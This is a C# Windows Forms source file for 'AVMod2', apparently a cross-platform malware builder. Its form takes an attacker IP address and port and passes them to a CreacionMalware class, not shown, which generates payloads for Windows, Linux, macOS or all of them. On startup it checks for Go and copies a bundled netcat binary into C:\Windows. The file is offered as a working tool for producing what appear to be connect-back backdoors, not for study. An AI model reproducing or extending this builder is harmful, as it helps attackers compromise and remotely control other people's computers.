using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace AVMod2
{
    public partial class AVMod2pro : Form
    {
        private string Wintxt = "Windows";
        private string Unitxt = "Unix";
        private string dato = Environment.OSVersion.ToString();
        Point formPosition;//Variable posicion
        Boolean mouseAction;//Booleano, activacion del mouse
        validacion valid = new validacion();
        CreacionMalware creacion = new CreacionMalware();
        private string path;
        public AVMod2pro()
        {
            InitializeComponent();
            if (Regex.IsMatch(dato, Wintxt, RegexOptions.IgnoreCase))
            {
                GoComprobar();
                NcComprobar();
            }
            else if (Regex.IsMatch(dato, Unitxt, RegexOptions.IgnoreCase))
            {
                monoComprobar();
                GocomprobarLinux();
            }
            else
            {
                MessageBox.Show("Sistema incompatible. Por favor informar: andresmontoyafcb@gmail.com", "Error.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
            }
        }
        private void GoComprobar()
        {
            path = @"C:\Go";
            if (!Directory.Exists(path))
            {
                MessageBox.Show("Por favor instalar go.", "Go no esta instalado.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("https://golang.org/dl/");
                this.Close();
            }
        }
        private void NcComprobar()
        {
            path = @"C:\Windows\nc.exe";
            if (!File.Exists(path))
            {
                DialogResult nc = MessageBox.Show(@"Moviendo nc.exe a C:\Windows", "Netcat no se encuentra.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                File.Move("nc.exe", path);
                this.Close();
            }
        }
        private void monoComprobar()
        {
            path = "/usr/bin/mono";
            if (!File.Exists(path))
            {
                DialogResult nc = MessageBox.Show("No se encontro mono. Por favor instalar.", "Mono no se encuentra.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("http://www.mono-project.com/docs/getting-started/install/linux/");
                this.Close();
            }
        }
        private void GocomprobarLinux()
        {
            path = "/opt/go";
            if (!Directory.Exists(path))
            {
                MessageBox.Show("Por favor instalar go, se recomienda instalarlo en /opt/", "Go no esta instalado.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("https://github.com/Spyrock/AVMod2");
                this.Close();
            }
        }
        private void cerrar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void cerrar_MouseHover(object sender, EventArgs e)
        {
            cerrar.ForeColor = Color.Red;
        }

        private void cerrar_MouseLeave(object sender, EventArgs e)
        {
            cerrar.ForeColor = Color.Black;
        }
        private void guardar_Click(object sender, EventArgs e)
        {
            //minimizar ventana
            this.WindowState = FormWindowState.Minimized;
        }
        private void guardar_MouseHover(object sender, EventArgs e)
        {
            guardar.ForeColor = Color.Red;
        }

        private void guardar_MouseLeave(object sender, EventArgs e)
        {
            guardar.ForeColor = Color.Black;
        }
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            //nueva posicion entre x and y
            formPosition = new Point(Cursor.Position.X - Location.X, Cursor.Position.Y - Location.Y);
            //activar variable
            mouseAction = true;
        }
        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseAction == true)
            {
                Location = new Point(Cursor.Position.X - formPosition.X, Cursor.Position.Y - formPosition.Y);
            }
        }
        private void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            //si soltamos el programa, la variable se desactiva
            mouseAction = false;
        }

        private void ip_KeyPress(object sender, KeyPressEventArgs e)
        {
            valid.validarIP(e);
        }

        private void puerto_KeyPress(object sender, KeyPressEventArgs e)
        {
            valid.validarPUERTO(e);
        }
        private void CheckedSistem()
        {
            if (mac.Checked == true)
            {
                creacion.mac();
            }
            else if (linux.Checked == true)
            {
                creacion.linux();
            }
            else if (todos.Checked == true)
            {
                creacion.todos();
            }
            else
            {
                MessageBox.Show("Por favor seleccione una opción.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void go_Click(object sender, EventArgs e)
        {
            creacion.IpAdress = ip.Text;
            creacion.Puerto1 = puerto.Text;
            //if the system is Windows
            if (Regex.IsMatch(dato, Wintxt, RegexOptions.IgnoreCase))
            {
                if (Windows.Checked == true)
                {
                    creacion.windows();
                }
                else
                {
                    CheckedSistem();
                }
            }
            //if the system is Unix
            else if (Regex.IsMatch(dato, Unitxt, RegexOptions.IgnoreCase))
            {
                if (Windows.Checked == true)
                {
                    creacion.windowsLinux();
                }
                else
                {
                    CheckedSistem();
                }
            }
        }
        private void twitter_Click(object sender, EventArgs e)
        {
            twitter.BackColor = Color.Crimson;
            Process.Start("https://twitter.com/AndresMontoyaIN");
        }

        private void google_Click(object sender, EventArgs e)
        {
            google.BackColor = Color.Crimson;
            Process.Start("https://plus.google.com/+SpyRockLinux");
        }

        private void git_Click(object sender, EventArgs e)
        {
            git.BackColor = Color.Crimson;
            Process.Start("https://github.com/Spyrock");
        }
    }
}
